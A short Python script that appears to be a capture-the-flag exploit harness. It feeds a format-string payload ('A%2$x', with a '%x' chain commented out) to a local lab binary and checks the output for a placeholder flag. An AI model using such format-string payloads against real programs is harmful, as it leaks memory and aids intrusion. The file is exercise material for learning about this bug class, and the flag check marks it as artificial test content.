import subprocess
import sys

def check_flag(output: tuple) -> bool:
    flag = b'CTF_FLAG{example_flag}'
    for out in output:
        if flag in out:
            return True
    return False

def print_win():
    print("-"*80)
    print("Exploit Success")
    print("-"*80)

def main():

    print("starting exploit...\n")
    cmd = "./build/a.out"
    #payload = "%x.%x.%x.%x.".encode()
    payload = b'A%2$x'
    proc = subprocess.Popen([cmd], 
                            stdin=subprocess.PIPE, 
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT)
    output = proc.communicate(input=payload, timeout=3)

    [print(x.decode()) for x in output if type(x) is bytes]

    if check_flag(output):
        print_win()
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == '__main__':
    main()
